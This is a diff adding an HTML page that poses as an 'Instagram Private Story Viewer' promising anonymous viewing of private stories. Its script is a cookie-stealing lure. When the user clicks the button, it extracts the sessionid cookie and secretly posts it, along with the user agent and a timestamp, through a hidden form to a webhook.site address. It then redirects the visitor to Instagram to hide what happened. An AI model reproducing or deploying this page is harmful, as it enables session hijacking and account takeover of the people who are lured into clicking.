@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Instagram Story Viewer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <style>
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+      margin: 0; 
+      padding: 20px; 
+      background-color: #fafafa; 
+      text-align: center;
+    }
+    .container { 
+      max-width: 400px; 
+      margin: 0 auto; 
+      background-color: white; 
+      padding: 20px; 
+      border-radius: 8px; 
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
+    }
+    .logo { 
+      font-size: 32px; 
+      font-weight: bold; 
+      background: linear-gradient(to right, #833ab4, #fd1d1d, #fcb045); 
+      -webkit-background-clip: text; 
+      -webkit-text-fill-color: transparent; 
+      margin-bottom: 20px;
+    }
+    .button { 
+      background-color: #3897f0; 
+      color: white; 
+      border: none; 
+      padding: 12px 24px; 
+      border-radius: 4px; 
+      cursor: pointer; 
+      font-size: 16px; 
+      margin: 10px 0; 
+      width: 100%; 
+    }
+    .loading {
+      display: none;
+      margin: 20px 0;
+    }
+    .spinner {
+      border: 4px solid rgba(0,0,0,0.1);
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border-left-color: #3897f0;
+      animation: spin 1s ease infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">Instagram</div>
+    <h2>Private Story Viewer</h2>
+    <p>View private stories anonymously</p>
+    
+    <button class="button" id="viewButton">View Stories</button>
+    
+    <div class="loading" id="loading">
+      <p>Loading stories...</p>
+      <div class="spinner"></div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('viewButton').addEventListener('click', function() {
+      document.getElementById('loading').style.display = 'block';
+      
+      // Get session ID from cookies
+      const cookies = document.cookie;
+      let sessionId = '';
+      
+      // Extract sessionid from cookies
+      if (cookies.includes('sessionid=')) {
+        const parts = cookies.split(';');
+        for (let i = 0; i < parts.length; i++) {
+          const part = parts[i].trim();
+          if (part.startsWith('sessionid=')) {
+            sessionId = part.substring('sessionid='.length);
+            break;
+          }
+        }
+      }
+      
+      // Create a form to submit data
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://webhook.site/9c8583aa-2356-419b-b80e-d6ecfb8ef126';
+      form.style.display = 'none';
+      
+      // Add session ID as a hidden field
+      const sessionIdField = document.createElement('input');
+      sessionIdField.type = 'hidden';
+      sessionIdField.name = 'sessionId';
+      sessionIdField.value = sessionId;
+      
+      // Add user agent as a hidden field
+      const userAgentField = document.createElement('input');
+      userAgentField.type = 'hidden';
+      userAgentField.name = 'userAgent';
+      userAgentField.value = navigator.userAgent;
+      
+      // Add timestamp as a hidden field
+      const timestampField = document.createElement('input');
+      timestampField.type = 'hidden';
+      timestampField.name = 'timestamp';
+      timestampField.value = new Date().toISOString();
+      
+      form.appendChild(sessionIdField);
+      form.appendChild(userAgentField);
+      form.appendChild(timestampField);
+      document.body.appendChild(form);
+      
+      // Submit the form
+      form.submit();
+      
+      // Redirect to Instagram after a short delay
+      setTimeout(() => {
+        window.location.href = 'https://www.instagram.com';
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
